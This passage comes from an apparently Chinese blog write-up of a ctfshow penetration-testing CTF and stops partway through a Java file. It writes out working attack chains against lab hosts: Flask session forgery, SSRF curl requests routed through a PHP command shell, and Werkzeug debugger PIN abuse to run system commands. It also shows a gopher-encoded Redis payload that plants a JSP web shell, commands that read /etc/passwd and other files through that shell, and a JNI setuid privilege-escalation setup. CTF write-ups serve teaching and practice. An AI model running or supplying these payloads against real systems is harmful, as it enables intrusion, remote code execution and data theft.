ctfshow&#123;账号_密码&#125;</span><br></pre></td></tr></table></figure><p>然后我们看看根目录，发现存在一个secret.txt文件，查看一下。</p><p>获得一串base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YUdGamEyVnlYMk4wWm5Ob2IzZEFNVFl6TG1OdmJTOUk=</span><br><span class="line">WVdOclpYSmZZM1JtYzJnd2R3PT0=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFja2VyX2N0ZnNob3dAMTYzLmNvbS9I</span><br><span class="line">YWNrZXJfY3Rmc2gwdw==</span><br></pre></td></tr></table></figure><p>解码后拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker_ctfshow@163.com/Hacker_ctfsh0w</span><br></pre></td></tr></table></figure><p>邮箱号加密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;hacker_ctfshow@163.com_Hacker_ctfsh0w&#125;</span><br></pre></td></tr></table></figure><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交log_server_key.txt内容</span><br></pre></td></tr></table></figure><p>本章的重点是flask服务器，之前我们看到过源码，在8888端口</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165937711.png" class="" title="This is an example image"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename, join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>这里我们获取到了一个session值，看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VyIjoiZ3Vlc3QifQ.Z3zuOw.FYFsUkqCVKObwblDG85AR5G7PRI</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107170758420.png" class="" title="This is an example image"><p>第一题我们的重点是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br></pre></td></tr></table></figure><p>那就是session伪造嘛。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107171222896.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VyIjoiYWRtaW4ifQ.Z3zvxA.3ctTGQeEHdsYY66hbZKoftfwOLg</span><br></pre></td></tr></table></figure><p>然后我们需要携带cookie访问&#x2F;key路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://172.2.78.5/cmd.php?0=curl+http://172.2.78.6:8888/key+--cookie+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3zvxA.3ctTGQeEHdsYY66hbZKoftfwOLg&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107172121397.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交flask所在服务器的/etc/passwd 文件最后一行内容</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br></pre></td></tr></table></figure><p>这里打pin码泄露，创建一个日志，然后把pin码打印到日志。</p><p>设置loggername为werkzeug记录flask的日志（不知道的可以打个断点看一下，在logdict里有）</p><p><img src="https://img2024.cnblogs.com/blog/3392505/202501/3392505-20250106215946821-295044882.png" alt="img"></p><p>查一下就可以知道这个logger可以记录flask的日志，那么打印出来的pin就会出现在日志中，然后getlogcontent即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#设置log</span><br><span class="line">http://172.2.95.5/1.php?1=system(&#x27;curl+-b+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot;+&quot;http://172.2.95.6:8888/set_log_option%3flogName=werkzeug%2526logFile=jwk.log&quot;&#x27;);</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124161450305.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#获取console的页面key</span><br><span class="line">http://172.2.95.5/1.php?1=system(&#x27;curl+-b+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot;+&quot;http://172.2.95.6:8888/console&quot;&#x27;);</span><br><span class="line"></span><br><span class="line">BDrrhrw6TzJCcFsCz6dj</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150000597.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#打印pin码到日志</span><br><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=printpin&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXByaW50cGluJnM9QkRycmhydzZUekpDY0ZzQ3o2ZGoi</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150445453.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150510020.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读log</span><br><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/get_log_content?logFile=jwk.log&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9nZXRfbG9nX2NvbnRlbnQ/bG9nRmlsZT1qd2subG9nIg==</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162224929.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">375-828-345</span><br></pre></td></tr></table></figure><p>终于读到pin了，卡了好久。。。</p><p>然后我们pinauth一下，获取cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=375-828-345&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXBpbmF1dGgmcGluPTM3NS04MjgtMzQ1JnM9QkRycmhydzZUekpDY0ZzQ3o2ZGoi</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162404620.png" class="" title="This is an example image"><p>显示auth为true，验证成功，这里我们保存cookie的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -v -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=375-828-345&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162717034.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wzdc58fd521ffb0cae532091737707116|910ebc3905cd</span><br></pre></td></tr></table></figure><p>然后进行rce：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -b &quot;__wzdc58fd521ffb0cae53209=1737707116|910ebc3905cd&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).system(&#x27;&#x27;&#x27;cat%20\/etc\/passwd&gt;.\/log\/jwk.log&#x27;&#x27;&#x27;)&amp;frm=0&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124163537697.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124163641184.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer:x:1000:1000::/home/ctfer:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102184258603.png" class="" title="This is an example image"><p>扫到一个java服务。jetty，没什么其他的，看看是否存在版本漏洞。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102185318086.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102185324743.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow_2025</span><br></pre></td></tr></table></figure><p>CVE-2021-28164</p><p><strong>提交 &#x2F;dylan.txt 中的key</strong></p><p>既然我们获得了redis的密码，那么我们接下来登录redis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://172.2.229.7:6380/auth:ctfshow_2025</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124164152106.png" class="" title="This is an example image"><p><img src="https://img2024.cnblogs.com/blog/3392505/202501/3392505-20250108131824159-136678188.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth ctfshow_2025</span><br><span class="line">config set dir /opt/jetty/webapps/ROOT/</span><br><span class="line">config set dbfilename hack.jsp</span><br><span class="line">set xxx &quot;&lt;% Runtime.getRuntime().exec(new String[]&#123;\&quot;sh\&quot;,\&quot;-c\&quot;,request.getParameter(\&quot;cmd\&quot;)&#125;);%&gt;&quot;</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;gopher://172.2.95.7:6380/_auth%20ctfshow_2025%0aconfig%20set%20dir%20%2fopt%2fjetty%2fwebapps%2fROOT%2f%0aconfig%20set%20dbfilename%20hack.jsp%0aset%20xxx%20%22%3c%25%20Runtime.getRuntime().exec(new%20String%5b%5d%7b%5c%22sh%5c%22%2c%5c%22-c%5c%22%2crequest.getParameter(%5c%22cmd%5c%22)%7d)%3b%25%3e%22%0asave%0aquit&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165521240.png" class="" title="This is an example image"><p>不出意外写马是成功的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.95.7:8080/hack.jsp?cmd=cat%20/dylan.txt&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165632050.png" class="" title="This is an example image"><p>然后去访问1.txt即可。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165700581.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7b11a7ae330883cb5bf667a9c1604635</span><br></pre></td></tr></table></figure><p><strong>提交&#x2F;root&#x2F;message.txt中提到的网址</strong></p><p>一眼需要提权！</p><p>列出文件能力：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.95.7:8080/hack.jsp?cmd=getcap%20-r%20/%202&gt;/dev/null&gt; /opt/jetty/webapps/ROOT/cap.txt</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124170452149.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/openjdk-8/bin/java = cap_setuid+ep</span><br></pre></td></tr></table></figure><p>好东西，java有setuid能力</p><p>写入 SetUID.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_SetUID_setUID</span><span class="params">(JNIEnv *env, jobject obj, jint uid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> setuid(uid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=echo%20&quot;I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line">//1111111111122</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL Java_SetUID_setUID(JNIEnv *env, jobject obj, jint uid) &#123;</span><br><span class="line">    return setuid(uid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#不知道为啥这里要注释一行才行，，，</span><br></pre></td></tr></table></figure><p>写入SetUID.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetUID</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;SetUID&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">setUID</span><span class="params">(<span class="type">int</span> uid)</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SetUID</span> <span class="variable">setUID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SetUID</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> 